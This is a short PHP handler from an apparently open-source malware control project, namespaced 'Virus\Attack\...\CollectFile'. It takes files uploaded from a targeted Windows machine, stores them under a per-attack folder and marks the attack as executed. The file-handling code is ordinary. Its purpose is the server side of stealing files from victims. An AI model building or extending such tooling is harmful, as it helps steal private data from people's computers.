<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile\CollectFile;
use Kelvinho\Virus\Singleton\Logs;

/** @var CollectFile $this */

for ($i = 0; $i < count($this->fileNames); $i++) if (!$this->requestData->hasFile("file$i")) Logs::error("Supposed to have file $i");
for ($i = 0; $i < count($this->fileNames); $i++) $this->requestData->moveFile("file$i", DATA_FILE . "/attacks/$this->attack_id/file$i");
$this->setExecuted();
$this->saveState();